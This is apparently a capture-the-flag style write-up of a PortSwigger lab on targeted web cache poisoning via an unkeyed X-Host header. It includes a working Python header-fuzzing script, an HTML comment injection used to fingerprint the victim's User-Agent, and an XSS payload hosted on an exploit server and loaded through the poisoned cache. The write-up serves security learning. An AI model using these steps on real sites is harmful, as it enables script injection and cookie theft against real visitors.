# Targeted web cache poisoning using an unknown header

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header), you'll learn: Targeted web cache poisoning using an unknown header! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to [web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning). A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123193253.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123193349.png)

In here, we see that the web application is using caches to cache the web content.

Also, it has a HTTP header called `Vary`, and **it specifies the `User-Agent` header.**

The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed. **It is commonly used to specify that the `User-Agent` header is keyed**, for example, so that if the mobile version of a website is cached, this won't be served to non-mobile users by mistake.

**Moreover, when we visit the website, it loaded a JavaScript from `/resources/js/tracking.js`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123193552.png)

**View source page:**
```html
<script type="text/javascript" src="//0a5500e503331cbbc06b90ea002f001a.web-security-academy.net/resources/js/tracking.js"></script>
```

**Now, we can test is it accepting the `X-Forwarded-Host` HTTP header. If it does, then we can poison the cache, and load any JavaScript file from any website:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123194436.png)

Nope. It doesn't work.

**To find header that changes the loaded JavaScript file domain, I'll write a Python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

class Requester:
    def __init__(self, url, wordlistPath):
        self.__url = url
        self.__wordlistPath = wordlistPath

    def readFileAndSendRequest(self):
        counter = 0
        with open(self.__wordlistPath, 'r') as file:
            for header in file:
                # Prevent our fuzzing is being cached.
                # Otherwise it won't find the valid HTTP header
                cacheBuster = f'?buster=buster{counter}'

                thread = Thread(target=self.sendRequest, args=(header.strip(), cacheBuster))
                thread.start()
                sleep(0.02)
                counter += 1

    def sendRequest(self, cleanHeader, cacheBuster):
        payload = {cleanHeader: 'web-cache-poisoning-header-fuzzing.com'}
        finalURL = self.__url + cacheBuster

        requestResult = requests.get(finalURL, headers=payload)
        print(f'[*] Trying HTTP header: {cleanHeader:40s}', end='\r')

        if 'web-cache-poisoning-header-fuzzing.com' in requestResult.text:
            print(f'[+] Found valid HTTP header: {cleanHeader}')

def main():
    url = 'https://0a5500e503331cbbc06b90ea002f001a.web-security-academy.net/'
    wordlistPath = '/usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers'

    requester = Requester(url, wordlistPath)
    requester.readFileAndSendRequest()

if __name__ == '__main__':
    main()
```

```shell
┌[root♥siunam]-(~/ctf/Portswigger-Labs/Web-Cache-Poisoning)-[2023.01.23|20:57:16(HKT)]
└> python3 fuzz_header.py
[+] Found valid HTTP header: X-Host
```

Found it! The `X-Host` header is valid!

**To confirm it, we can send the request again with the header:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123210009.png)

Nice!

Now, if we can control the JavaScript file domain, **we can poison the cache and load any JavaScript files from anywhere.**

But before we do that, let's find out victim's `User-Agent`!

**To do so, we can go to one of those posts in the home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123210202.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123210211.png)

As you can see, we can leave some comments and HTML is allowed.

**Let's create an `<img>` element that pointing to our exploit server. By doing that, we can finger print victim's `User-Agent` value:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123210343.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123210359.png)

**Exploit server access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123210421.png)

Found it!

- Victim `User-Agent`: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.74 Safari/537.36

Armed with above information, we can poison the web cache **with the victim's `User-Agent`** and our evil JavaScript file:

**Evil JavaScript file:**
```js
document.write('<img src=errorpls onerror=alert(document.cookie)>');
```

**Then host it on the exploit server:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123212203.png)

**Finally, poison the web cache:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123212241.png)

When the victim visit the website, it'll load our evil JavaScript file, which will then trigger an alert box.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Poisoning/Cache-4/images/Pasted%20image%2020230123212316.png)

# What we've learned:

1. Targeted web cache poisoning using an unknown header